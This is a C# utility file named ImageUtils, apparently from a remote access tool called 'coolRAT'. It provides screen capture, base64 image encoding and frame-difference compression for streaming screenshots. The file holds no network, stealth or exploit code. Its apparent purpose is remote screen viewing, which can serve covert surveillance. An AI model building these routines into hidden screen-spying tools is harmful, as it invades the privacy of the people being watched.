using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace coolRAT.Libs
{
    public static class ImageUtils
    {
        public static Image ResizeImage(Image source, Size size)
        {
            Image newImage = new Bitmap(size.Width, size.Height, PixelFormat.Format24bppRgb);
            using (Graphics GFX = Graphics.FromImage((Bitmap)newImage))
            {
                GFX.DrawImage(source, new Rectangle(Point.Empty, size));
            }
            return newImage;
        }

        public static Image TakeScreenshot(Screen Screen)
        {

            using (MemoryStream m = new MemoryStream())
            {
                Bitmap img = new Bitmap(Screen.Bounds.Width, Screen.Bounds.Height, PixelFormat.Format24bppRgb);
                Graphics g = Graphics.FromImage(img);
                g.CopyFromScreen(
                    Screen.Bounds.X,
                    Screen.Bounds.Y,
                    0,
                    0,
                    Screen.Bounds.Size); //yeet done.

                img.Save(m, ImageFormat.Png);
                img.Dispose();
                g.Dispose();
                return EscapeBlackColor((Bitmap)Image.FromStream(m));
            }
        }



        public static byte[] ToByteArray(Image source)
        {
            using (var stream = new MemoryStream())
            {
                source.Save(stream, ImageFormat.Png);
                return stream.ToArray();
            }
        }

        public static Image FromByteArray(byte[] source)
        {
            using (var stream = new MemoryStream(source))
            {
                return Image.FromStream(stream);
            }
        }

        public static string Encode(Image source)
        {
            using (MemoryStream m = new MemoryStream())
            {
                source.Save(m, ImageFormat.Png);
                byte[] imageBytes = m.ToArray();
                string base64String = Convert.ToBase64String(imageBytes);
                return base64String;
            }
        }

        public static Image Decode(string encoded)
        {
            using (MemoryStream m = new MemoryStream())
            {
                byte[] imageBytes = Convert.FromBase64String(encoded);
                m.Write(imageBytes, 0, imageBytes.Length);
                return Image.FromStream(m);
            }
        }

        public static Bitmap EscapeBlackColor(Bitmap _base)
        {
            #region Open BASE bitmap for read and write
            BitmapData baseData = _base.LockBits(new Rectangle(0, 0, _base.Size.Width, _base.Size.Height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);
            int base_bytesPerPixel = Image.GetPixelFormatSize(_base.PixelFormat) / 8;
            int base_byteCount = baseData.Stride * _base.Height;
            byte[] basePixels = new byte[base_byteCount];
            IntPtr base_FirstPixel = baseData.Scan0;
            Marshal.Copy(base_FirstPixel, basePixels, 0, basePixels.Length);
            int base_heightInPixels = baseData.Height;
            int base_widthInBytes = baseData.Width * base_bytesPerPixel;
            #endregion

            for (int y = 0; y < base_heightInPixels; y++)
            {
                int currentLine = y * baseData.Stride;
                for (int x = 0; x < base_widthInBytes; x = x + base_bytesPerPixel)
                {
                    if (basePixels[currentLine + x + 2] == 0 &&
                        basePixels[currentLine + x + 1] == 0 &&
                        basePixels[currentLine + x] == 0)
                    {
                        basePixels[currentLine + x + 2] = 1; //red
                        basePixels[currentLine + x + 1] = 1; //green
                        basePixels[currentLine + x] = 1; //blue
                    }
                }
            }
            Marshal.Copy(basePixels, 0, base_FirstPixel, basePixels.Length);
            _base.UnlockBits(baseData);
            return _base;
        }

        static public Bitmap Diff2Vector(Bitmap _base, Bitmap diff)
        {
            if (_base.Size != diff.Size)
                return null;

            #region Open BASE bitmap for write
            BitmapData baseData = _base.LockBits(new Rectangle(0, 0, _base.Size.Width, _base.Size.Height), ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);
            int base_bytesPerPixel = Image.GetPixelFormatSize(_base.PixelFormat) / 8;
            int base_byteCount = baseData.Stride * _base.Height;
            byte[] basePixels = new byte[base_byteCount];
            IntPtr base_FirstPixel = baseData.Scan0;
            Marshal.Copy(base_FirstPixel, basePixels, 0, basePixels.Length);
            int base_heightInPixels = baseData.Height;
            int base_widthInBytes = baseData.Width * base_bytesPerPixel;
            #endregion

            #region Open DIFF bitmap for read
            BitmapData diffData = diff.LockBits(new Rectangle(0, 0, diff.Size.Width, diff.Size.Height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);
            int diff_bytesPerPixel = Image.GetPixelFormatSize(diff.PixelFormat) / 8;
            int diff_byteCount = diffData.Stride * diff.Height;
            byte[] diffPixels = new byte[diff_byteCount];
            IntPtr diff_FirstPixel = diffData.Scan0;
            Marshal.Copy(diff_FirstPixel, diffPixels, 0, diffPixels.Length);
            int diff_heightInPixels = diffData.Height;
            int diff_widthInBytes = diffData.Width * diff_bytesPerPixel;
            #endregion

            for (int y = 0; y < base_heightInPixels; y++)
            {
                int currentLine = y * baseData.Stride;
                for (int x = 0; x < base_widthInBytes; x = x + base_bytesPerPixel)
                {
                    if (!(diffPixels[currentLine + x + 2] == 0 &&
                    diffPixels[currentLine + x + 1] == 0 &&
                    diffPixels[currentLine + x] == 0))
                    {
                        basePixels[currentLine + x + 2] = diffPixels[currentLine + x + 2]; //red
                        basePixels[currentLine + x + 1] = diffPixels[currentLine + x + 1]; //green
                        basePixels[currentLine + x] = diffPixels[currentLine + x]; //blue
                    }
                }
            }
            Marshal.Copy(basePixels, 0, base_FirstPixel, basePixels.Length);
            _base.UnlockBits(baseData);
            diff.UnlockBits(diffData);

            return _base;
        }

        public static Bitmap Vector2Diff(Bitmap _base, Bitmap _new)
        {
            Bitmap optimized = null;
            if (_base.Size != _new.Size)
            {
                return null;
            }

            #region Open OPTIMIZED bitmap for write
            optimized = new Bitmap(_base.Size.Width, _base.Size.Height, PixelFormat.Format24bppRgb);
            BitmapData optimizedData = optimized.LockBits(new Rectangle(0, 0, optimized.Size.Width, optimized.Size.Height), ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);
            int optimized_bytesPerPixel = Image.GetPixelFormatSize(optimized.PixelFormat) / 8;
            int optimized_byteCount = optimizedData.Stride * optimized.Height;
            byte[] optimizedPixels = new byte[optimized_byteCount];
            IntPtr optimized_FirstPixel = optimizedData.Scan0;
            Marshal.Copy(optimized_FirstPixel, optimizedPixels, 0, optimizedPixels.Length);
            int optimized_heightInPixels = optimizedData.Height;
            int optimized_widthInBytes = optimizedData.Width * optimized_bytesPerPixel;
            #endregion

            #region Open BASE bitmap for read
            BitmapData baseData = _base.LockBits(new Rectangle(0, 0, _base.Size.Width, _base.Size.Height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);
            int base_bytesPerPixel = Image.GetPixelFormatSize(_base.PixelFormat) / 8;
            int base_byteCount = baseData.Stride * _base.Height;
            byte[] basePixels = new byte[base_byteCount];
            IntPtr base_FirstPixel = baseData.Scan0;
            Marshal.Copy(base_FirstPixel, basePixels, 0, basePixels.Length);
            int base_heightInPixels = baseData.Height;
            int base_widthInBytes = baseData.Width * base_bytesPerPixel;
            #endregion

            #region Open NEW bitmap for read
            BitmapData newData = _new.LockBits(new Rectangle(0, 0, _new.Size.Width, _new.Size.Height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);
            int new_bytesPerPixel = Image.GetPixelFormatSize(_new.PixelFormat) / 8;
            int new_byteCount = newData.Stride * _new.Height;
            byte[] newPixels = new byte[new_byteCount];
            IntPtr new_FirstPixel = newData.Scan0;
            Marshal.Copy(new_FirstPixel, newPixels, 0, newPixels.Length);
            int new_heightInPixels = newData.Height;
            int new_widthInBytes = newData.Width * new_bytesPerPixel;
            #endregion


            for (int y = 0; y < optimized_heightInPixels; y++)
            {
                int currentLine = y * optimizedData.Stride;
                for (int x = 0; x < optimized_widthInBytes; x = x + optimized_bytesPerPixel)
                {
                    Color base_pixel = Color.FromArgb(255, basePixels[currentLine + x + 2], basePixels[currentLine + x + 1], basePixels[currentLine + x]);
                    Color new_pixel = Color.FromArgb(255, newPixels[currentLine + x + 2], newPixels[currentLine + x + 1], newPixels[currentLine + x]);

                    if (base_pixel != new_pixel)
                    {
                        optimizedPixels[currentLine + x + 2] = new_pixel.R; //red
                        optimizedPixels[currentLine + x + 1] = new_pixel.G; //green
                        optimizedPixels[currentLine + x] = new_pixel.B; //blue
                    }
                    else
                    {
                        optimizedPixels[currentLine + x + 2] = 0; //red
                        optimizedPixels[currentLine + x + 1] = 0; //green
                        optimizedPixels[currentLine + x] = 0; //blue
                    }
                }
            }
            Marshal.Copy(optimizedPixels, 0, optimized_FirstPixel, optimizedPixels.Length);
            optimized.UnlockBits(optimizedData);
            _base.UnlockBits(baseData);
            _new.UnlockBits(newData);

            return optimized;
        }
    }
}
